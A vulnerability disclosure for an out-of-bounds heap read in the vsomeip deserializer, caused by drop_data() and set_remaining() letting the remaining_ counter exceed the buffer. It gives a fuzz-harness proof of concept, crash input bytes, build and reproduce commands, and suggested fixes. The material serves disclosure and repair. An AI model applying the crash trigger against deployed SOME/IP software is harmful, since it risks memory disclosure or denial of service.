### Title

Out-of-bounds heap read in `vsomeip_v3::deserializer` caused by inconsistent `remaining_` bookkeeping (`drop_data` / `set_remaining`)

### Summary

`vsomeip_v3::deserializer` performs bounds checking solely against its internal `remaining_` counter, but several buffer-management APIs allow `remaining_` to diverge from the true number of bytes available between `position_` and the end of the buffer. When `remaining_` exceeds the real available bytes, subsequent `deserialize()` calls read past the end of the heap buffer (ASan: `heap-buffer-overflow`). Discovered via coverage-guided fuzzing (libFuzzer + ASan). Severity: Low for the default build, because the standard network deserialization path validates the values fed to `set_remaining()` and never calls `drop_data()`/`append_data()`; however this is a latent memory-safety defect in the public deserializer API.

### Details

**Root cause**

The deserializer keeps three related fields (`implementation/message/include/deserializer.hpp`): a byte buffer `data_`, a read cursor `position_`, and a counter `remaining_`. Every `deserialize()` overload trusts `remaining_` instead of the real buffer bounds:

```cpp
// implementation/message/src/deserializer.cpp:41-48
bool deserializer::deserialize(uint8_t& _value) {
    if (0 == remaining_)
        return false;

    _value = *position_++;   // line 45: no check that position_ < data_.end()

    remaining_--;
    return true;
}
```

Two APIs break the invariant `remaining_ == data_.end() - position_`:

1. `drop_data()` (deserializer.cpp:189-194) advances `position_` **without** decrementing `remaining_`:

```cpp
void deserializer::drop_data(std::size_t _length) {
    if (position_ + static_cast<std::vector<byte_t>::difference_type>(_length) < data_.end())
        position_ += static_cast<std::vector<byte_t>::difference_type>(_length);
    else
        position_ = data_.end();
    // BUG: remaining_ is not reduced -> remaining_ > actual bytes left
}
```

2. `set_remaining()` (deserializer.cpp:37-39) accepts an arbitrary value without clamping to the true available bytes:

```cpp
void deserializer::set_remaining(std::size_t _remaining) {
    remaining_ = _remaining;   // BUG: no clamp to (data_.end() - position_)
}
```

Once `remaining_` is larger than the bytes actually left from `position_`, the primitive `deserialize(uint8_t&)` loop dereferences `position_` beyond `data_.end()`, producing an out-of-bounds heap read.

**Crash location**

```
SUMMARY: AddressSanitizer: heap-buffer-overflow
    implementation/message/src/deserializer.cpp:45:14
    in vsomeip_v3::deserializer::deserialize(unsigned char&)
```

**Reachability assessment**

In the standard production path (`implementation/service_discovery/src/message_impl.cpp:234-300`), values passed to `set_remaining()` are validated (`entries_length > save_remaining` is rejected before the call), and `drop_data()`/`append_data()` have no production callers. Therefore this exact OOB read is not directly reachable from untrusted network input through the default code path. It is a latent API-robustness defect: any current or future caller that combines `drop_data()`/`set_remaining()` (or otherwise lets `remaining_` exceed the true available bytes) will trigger an OOB heap read.

**CVE**: suspected new finding, no confirmed CVE match.

### PoC

**1. Fuzz harness (minimized trigger derived from `fuzz_deserializer.cc`)**

```cpp
// fuzz_deserializer_poc.cc
#include <cstdint>
#include <cstddef>
#include <vector>
#include "deserializer.hpp"

using vsomeip_v3::deserializer;
using vsomeip_v3::byte_t;

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size < 2 || size > 100000) return 0;
    try {
        const uint32_t shrink_threshold = static_cast<uint32_t>(data[0]);
        const size_t body_size = size - 1;
        const uint8_t *body = data + 1;

        std::vector<byte_t> buf(body, body + body_size);
        deserializer d(shrink_threshold);
        d.set_data(buf);

        // drop_data() advances position_ but does NOT decrement remaining_
        d.drop_data(body_size / 2);

        // set_remaining() accepts an arbitrary value without clamping:
        // now remaining_ > actual bytes left from position_
        d.set_remaining(body_size);

        uint8_t v = 0;
        while (d.get_remaining() > 0) {
            if (!d.deserialize(v)) break;  // OOB heap read at deserializer.cpp:45
        }
    } catch (...) {
        // exceptions are not crashes
    }
    return 0;
}
```

**2. Build command (clang + ASan + libFuzzer)**

```bash
clang++ -std=c++17 -g -fsanitize=fuzzer,address \
    -I vsomeip-master/implementation/message/include \
    -I vsomeip-master/implementation/utility/include \
    -I vsomeip-master/implementation/routing/include \
    fuzz_deserializer_poc.cc \
    vsomeip-master/implementation/message/src/deserializer.cpp \
    vsomeip-master/implementation/utility/src/bithelper.cpp \
    -o fuzz_deserializer_poc
```

(Adjust include paths to match your checkout; `deserializer.cpp` only needs `message_impl.hpp`, `deserializer.hpp` and `bithelper.hpp`. The full harness deliberately avoids `deserialize_message()` so `message_impl.cpp` is not required.)

**3. Trigger input (8 bytes, from the original fuzzer crash)**

```
00 7a ff ff 0a 51 ff 79
```

Create the PoC file:

```bash
printf '\x00\x7a\xff\xff\x0a\x51\xff\x79' > poc_crash.bin
```

A second crash input with the same root cause: `28 7a 86 67 bb 23 06 41`.

**4. Reproduce command**

```bash
./fuzz_deserializer_poc poc_crash.bin
```

**5. Expected ASan output**

```
==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 1 at 0x... thread T0
    #0 ... in vsomeip_v3::deserializer::deserialize(unsigned char&)
        implementation/message/src/deserializer.cpp:45:14
    ...
SUMMARY: AddressSanitizer: heap-buffer-overflow
    implementation/message/src/deserializer.cpp:45:14
    in vsomeip_v3::deserializer::deserialize(unsigned char&)
```

### Impact

- **Type**: out-of-bounds heap read (CWE-125).
- **Consequence**: potential information disclosure (reading adjacent heap memory) and/or denial of service (crash) in any application that drives the deserializer buffer-management API with attacker-influenced lengths.
- **Affected component**: `vsomeip_v3::deserializer` (`implementation/message/src/deserializer.cpp`), all versions with the current `drop_data()`/`set_remaining()` semantics.
- **Attack scenario**: the default SOME/IP-SD network deserialization path validates lengths before `set_remaining()` and never calls `drop_data()`, so remote exploitation over the wire is not demonstrated. The defect becomes exploitable in any integration (current or future) that exposes `drop_data()`/`set_remaining()`/`append_data()` to externally influenced values.
- **Severity**: Low (latent API defect; not directly reachable via the default network path).

**Recommended fix** — enforce the invariant `remaining_ <= data_.end() - position_`:

1. `drop_data()` should decrement `remaining_` by the dropped amount;
2. `set_remaining()` should clamp its argument to the actual available bytes;
3. `deserialize()` overloads should bounds-check against the true buffer end instead of trusting `remaining_` alone.

---
*Found by OSS-Fuzz style coverage-guided fuzzing (libFuzzer + AddressSanitizer).*
*Crash files: crash-f3cf86e1152fc50feef0462bcee81ea654b58cdd, crash-cb6d5abff84c48093c40a47b81d870b41886381f (same root cause, merged).*
